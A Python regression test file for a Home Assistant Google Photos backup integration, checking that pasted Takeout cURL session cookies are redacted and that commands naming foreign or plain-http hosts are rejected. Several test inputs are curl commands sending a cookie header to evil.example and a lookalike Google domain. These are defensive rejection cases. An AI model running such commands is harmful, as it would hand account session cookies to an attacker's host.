"""Regression tests for keeping the captured Takeout session's secrets in
place.

takeout_curl_session holds a pasted cURL/PowerShell command - i.e. the
user's Google account session cookies. These tests pin down the three
ways it used to leak or be misused:

  - the diagnostics export (pasted into public issues) included it verbatim
  - error strings carried full download URLs, query tokens included, into
    sensor attributes / the recorder / diagnostics
  - any URL in the pasted command was accepted, so the cookies would have
    been sent to whatever host (or plain http://) it named
"""
from __future__ import annotations

import json

from homeassistant import config_entries, data_entry_flow
from pytest_homeassistant_custom_component.common import MockConfigEntry

from custom_components.google_photos_backup.backends.curl_session import parse_curl_session
from custom_components.google_photos_backup.backends.takeout_backend import (
    _curl_session_issue_id,
)
from custom_components.google_photos_backup.const import (
    BACKEND_TAKEOUT,
    CONF_BACKEND,
    CONF_TAKEOUT_CURL_SESSION,
    CONF_TAKEOUT_DRIVE_SYNC,
    CONF_TAKEOUT_WATCH_DIR,
    CONF_TARGET_DIR,
    DOMAIN,
    MAX_REPORTED_ERRORS,
)
from custom_components.google_photos_backup.coordinator import sanitize_errors
from custom_components.google_photos_backup.diagnostics import (
    async_get_config_entry_diagnostics,
)
from custom_components.google_photos_backup.repairs import async_create_fix_flow

_COOKIE_SECRET = "SID=SECRET-SESSION-COOKIE"
_VALID_CURL = (
    "curl 'https://takeout-download.usercontent.google.com/download/"
    f"takeout-20260923T121036Z-1-001.zip?j=abc&i=0' -H 'cookie: {_COOKIE_SECRET}'"
)


async def test_curl_session_is_redacted_from_diagnostics(hass):
    entry = MockConfigEntry(
        domain=DOMAIN,
        data={CONF_BACKEND: BACKEND_TAKEOUT, CONF_TAKEOUT_CURL_SESSION: _VALID_CURL},
        options={CONF_TAKEOUT_CURL_SESSION: _VALID_CURL},
    )
    entry.add_to_hass(hass)

    blob = json.dumps(await async_get_config_entry_diagnostics(hass, entry))

    assert "SECRET-SESSION-COOKIE" not in blob


def test_parser_rejects_non_google_and_plain_http_urls():
    assert parse_curl_session(_VALID_CURL) is not None
    for bad_url in (
        "https://evil.example/download/takeout-20260923T121036Z-1-001.zip",
        "http://takeout-download.usercontent.google.com/download/takeout-20260923T121036Z-1-001.zip",
        "https://takeout.google.com.evil.example/takeout-20260923T121036Z-1-001.zip",
    ):
        curl = f"curl '{bad_url}' -H 'cookie: {_COOKIE_SECRET}'"
        assert parse_curl_session(curl) is None, bad_url


def test_sanitize_errors_strips_url_queries_and_caps_the_list():
    err = (
        "takeout-1-001.zip: 500, message='Internal Server Error', "
        "url='https://takeout-download.usercontent.google.com/download/x.zip?j=TOKEN&rapt=SECRET'"
    )
    cleaned = sanitize_errors([err])
    assert "TOKEN" not in cleaned[0] and "SECRET" not in cleaned[0]
    assert "https://takeout-download.usercontent.google.com/download/x.zip?<redacted>" in cleaned[0]

    many = sanitize_errors([f"err{i}" for i in range(MAX_REPORTED_ERRORS + 7)])
    assert len(many) == MAX_REPORTED_ERRORS + 1
    assert many[-1] == "... and 7 more errors"


async def test_repair_flow_rejects_an_unusable_command(hass):
    entry = MockConfigEntry(domain=DOMAIN, data={}, options={})
    entry.add_to_hass(hass)
    flow = await async_create_fix_flow(
        hass, _curl_session_issue_id(entry.entry_id), {"entry_id": entry.entry_id}
    )
    flow.hass = hass

    result = await flow.async_step_confirm({CONF_TAKEOUT_CURL_SESSION: "curl https://evil.example/x"})

    assert result["type"] == data_entry_flow.FlowResultType.FORM
    assert result["errors"] == {CONF_TAKEOUT_CURL_SESSION: "invalid_curl_session"}
    assert CONF_TAKEOUT_CURL_SESSION not in entry.options


async def test_takeout_config_flow_rejects_an_unusable_command(hass, tmp_path):
    result = await hass.config_entries.flow.async_init(
        DOMAIN, context={"source": config_entries.SOURCE_USER}
    )
    result = await hass.config_entries.flow.async_configure(
        result["flow_id"], {CONF_BACKEND: BACKEND_TAKEOUT}
    )
    result = await hass.config_entries.flow.async_configure(
        result["flow_id"], {CONF_TAKEOUT_DRIVE_SYNC: False}
    )
    result = await hass.config_entries.flow.async_configure(
        result["flow_id"],
        {
            CONF_TARGET_DIR: str(tmp_path),
            "sync_interval_minutes": 60,
            CONF_TAKEOUT_WATCH_DIR: str(tmp_path),
            CONF_TAKEOUT_CURL_SESSION: "curl 'http://evil.example/takeout-x-1-001.zip' -H 'cookie: a=b'",
        },
    )

    assert result["type"] == data_entry_flow.FlowResultType.FORM
    assert result["step_id"] == "takeout"
    assert result["errors"] == {CONF_TAKEOUT_CURL_SESSION: "invalid_curl_session"}
